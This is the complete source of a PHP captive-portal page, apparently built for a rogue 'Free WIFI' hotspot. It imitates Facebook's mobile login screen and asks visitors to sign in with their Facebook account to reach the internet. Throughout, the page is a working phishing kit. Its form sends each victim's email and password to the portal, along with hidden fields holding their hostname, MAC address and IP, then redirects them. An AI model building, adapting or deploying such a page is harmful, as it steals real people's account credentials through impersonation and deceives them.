<?php
$destination = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['HTTP_URI'] . "";
require_once('helper.php');
?>
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<title>Welcome to Facebook</title>
		<meta name="referrer" content="default" id="meta_referrer" />

		<meta http-equiv="pragma" content="no-cache" />
		<meta http-equiv="expires" content="-1" />
		<meta http-equiv="cache-control" content="no-cache" />

		<style type="text/css">/*
			<![CDATA[*/.b .bl{border:solid 1px #999;box-sizing:border-box;width:100%;}.b .bv{display:block;width:auto;}.b .bv a.bw,.b .bv a.bw:hover{background-color:#69a74e;color:#fff;height:44px;}.b .br{display:block;margin-bottom:5px;margin-left:3%;margin-top:-3px;overflow:hidden;text-align:center;white-space:nowrap;width:94%;}.b .br>span{display:inline-block;position:relative;}.b .br>span:before,.b .br>span:after{background:#ced0d4;content:"";height:1px;position:absolute;top:50%;width:9999px;}.b .br>span:before{margin-right:15px;right:100%;}.b .br>span:after{left:100%;margin-left:15px;}.b .bs{color:#4b4f56;font-size:14px;}.w{padding:8px;}.bz{padding-bottom:12px;padding-top:12px;}.by{padding-left:4px;padding-right:4px;}.bu{padding-left:8px;padding-right:8px;}.bi{padding-bottom:4px;}.b .t{border:0;border-collapse:collapse;margin:0;padding:0;width:100%;}.b .t tbody{vertical-align:top;}.b .t td{padding:0;}.b .t td.be{padding:4px;}.b .u{width:100%;}.v{background:#fa3e3e;}.x{color:#fff;}.b .x a,.b .x a:visited{color:#fff;font-weight:bold;}.b .x a:focus,.b .x a:hover{background:#1d2129;}.cb{color:#4b4f56;}.y{font-size:12px;line-height:16px;}.ca{font-size:16px;line-height:20px;}.bg{font-weight:bold;}.bt{text-align:center;}form{margin:0;border:0;}.bd{margin:0;}.bd li{display:block;list-style:none;}.b .cc{padding:0;}.b .be{padding:4px;}.b .bh{color:#90949c;font-weight:bold;}.b .bk{padding:12px 8px;color:#1d2129;}.bj{border:0;display:block;margin:0;padding:0;}.bm{box-sizing:border-box;width:100%;}.b .bn{border:solid 1px #999;}.n{appearance:none;background:none;display:inline-block;font-size:12px;height:28px;line-height:28px;margin:0;overflow:visible;padding:0 9px;text-align:center;vertical-align:top;white-space:nowrap;}.b .n{border-radius:2px;}.bx,a.bx,.b a.bx,.b a.bx:visited{background-color:#f6f7f9;color:#4b4f56;}.b a.bx:hover,.b .bx:hover{background-color:#e9ebee;color:#4b4f56;}.b .bx{border:1px solid #bec2c9;}.bx[disabled]{color:#bec2c9;}.b .bx[disabled]:hover{background-color:#f6f7f9;color:#bec2c9;}.bq,.q,a.bq,a.q,html .b a.bq,html .b a.q{color:#fff;}.b .q{background-color:#4080ff;border:1px solid #4476e8;}.b a.q:hover,.b .q:hover{background-color:#4580ef;}.b .bq{background-color:#4267b2;border:1px solid #365899;}.b a.bq:hover,.b .bq:hover{background-color:#465e91;}.bq[disabled]{color:#899bc1;}.q[disabled]{color:#91b4fd;}.b .bq[disabled]:hover{background-color:#4267b2;}.b .q[disabled]:hover{background-color:#4080ff;}.bp{font-size:14px;height:44px;line-height:44px;padding:0 20px;}.n .s{display:inline-block;}.b .n .s{display:inline-block;margin-top:0;vertical-align:middle;}.b a.n::after{content:"";display:inline-block;height:100%;vertical-align:middle;}.n .s{line-height:20px;margin-top:4px;}.bp .s{line-height:24px;margin-top:10px;}.n.bo{display:block;width:100%;}a.n.bo,.b label.n.bo{display:block;width:auto;}.b .n{padding:0 8px;}.b a.n{height:26px;line-height:26px;}.b .bp{padding:0 19px;}.b a.bp{font-size:14px;height:42px;line-height:42px;}.s{pointer-events:none;}.b a,.b a:visited{color:#3b5998;text-decoration:none;}.b a:focus,.b a:hover{background-color:#3b5998;color:#fff;}body{text-align:left;direction:ltr;}body,tr,input,textarea,button{font-family:sans-serif;}body,p,figure,h1,h2,h3,h4,h5,h6,ul,ol,li,dl,dd,dt{margin:0;padding:0;}h1,h2,h3,h4,h5,h6{font-size:1em;font-weight:bold;}ul,ol{list-style:none;}article,aside,figcaption,figure,footer,header,nav,section{display:block;}.d #viewport{margin:0 auto;max-width:600px;}.f{background-color:#fff;}.h{background-color:#3b5998;}.z{background-color:#eceff5;}#page{position:relative;}.b .o span{font-size:14px;}.b a.p,.b a.p:hover{background-color:#69a74e;color:#fff;}.i{padding:2px 3px;}.j{width:100%;}.j .l{text-align:right;}.k{border:0;display:inline-block;vertical-align:top;}i.k u{position:absolute;width:0;height:0;overflow:hidden;}.ch{display:block;font-size:x-small;margin:-3px -3px 1px -3px;padding:3px;}.cj{border:1px solid #90949c;display:block;font-size:x-large;height:20px;line-height:18px;text-align:center;vertical-align:middle;width:20px;}.b .ce input,.b .ce input:visited,.b .ce a,.b .ce a:visited{color:#bec2c9;}.b .ce input:focus,.b .ce input:hover,.b .ce a:focus,.b .ce a:hover{background:#dddfe2;color:#1d2129;}.cd{background-color:#4b4f56;font-size:x-small;padding:7px 8px 8px;}.cg{color:#bec2c9;display:block;font-size:x-small;margin:-3px -3px 1px -3px;padding:3px;}.ck{color:#fff;}body,tr,input,textarea,.g{font-size:medium;}/*]]>*/
		</style>
		
 <!-- <script src="jquery-2.2.1.min.js"></script> -->


  <script type="text/javascript">
     function redirect() {
        setTimeout(function() { window.location = "/captiveportal/index.php"; }, 100);
      }
 </script>
		<meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know." />
		<!-- link rel="canonical" href="https://www.facebook.com/" /> -->
	</head>
	<body tabindex="0" class="b c d e f">
		<div class="g">
			<div id="viewport">
				<div class="h i" id="header">
					<table cellspacing="0" cellpadding="0" class="j">
						<tr>
							<td>
							<div style="color: white; padding: 15px;">Welcome to <b>Free WIFI</b>, please login with your <img src="../../../../../../../../../../assets/img/Hr-BYIHPE6H.png" width="79" height="15" class="k" alt="facebook" />
								</h1> account to access the internet!</div><br/>
							</td>
						</tr>
						<tr>
							<td valign="middle">
								<h1>
									<img src="../../../../../../../../../../assets/img/Hr-BYIHPE6H.png" width="79" height="15" class="k" alt="facebook" />
								</h1>
							</td>
							<td valign="middle" class="l">
								<a class="m n o p q" href="">
									<span class="s">Create Account</span>
								</a>
							</td>
						</tr>
					</table>
				</div>
				<div id="objects_container">
					<div class="f" id="root">
						<table class="t">
							<tbody>
								<tr>
									<td class="u">
										<div class="v w x" style="display: none;">
											<div class="y"></div>
										</div>
										<div>
											<div></div>
											<div class="z ba">
												
												
												
												
												
												<form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="bb bc" id="login_form" novalidate="1">
													<ul class="bd be bf">
														<li class="be">
															<h3 class="bg bh bi">Email or Phone</h3>
															<input class="bj bk bl" type="text" name="email" placeholder="Email or Phone" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required />
														</li>
														<li class="be">
															<div>
																<h3 class="bg bh bi">Password</h3>
																<input class="bj bk bm bn" type="password" name="password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required />
															</div>
														</li>
														<li class="be">
															<input value="Log In" type="submit" name="login" class="m n bo bp bq" />
														</li>
													</ul>
													<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>" />
													<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>" />
													<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>" />
													<input type="hidden" name="target" value="<?=$destination?>" />
													<div></div>
													<noscript>
													</noscript>
												</form>
												
												
												
												
												<div class="br">
													<span class="bs">or</span>
												</div>
												<div class="bt bu">
													<div class="bt bv" id="signup-button">
														<a class="m n bw bx" href="">
															<span class="s">Create New Account</span>
														</a>
													</div>
												</div>
												<div class="by bz">
													<span class="ca cb">
														<ul class="bd cc">
															<li class="be">
																<a href="">Forgot Password?</a>
															</li>
															<li class="be">
																<a href="" id="help-link">Help Center</a>
															</li>
														</ul>
													</span>
												</div>
											</div>
										</div>
									</td>
								</tr>
							</tbody>
						</table>
						<div></div>
					</div>
				</div>
				<div>
					<div class="cd">
						<div class="ce">
							<table class="t">
								<tbody>
									<tr>
										<td class="u cf" style="width:50%">
											<a class="ch">English (US)</a>
										</td>
										<td class="u ci" style="width:50%">
											<b class="cg" href="">Italiano</b>
											<a class="ch" href="">Espanol</a>
											<a class="ch" href="">
												<div class="cj"> + </div>
											</a>
										</td>
									</tr>
								</tbody>
							</table>
						</div>
						<span class="bg ck">Facebook &copy; 2017</span>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>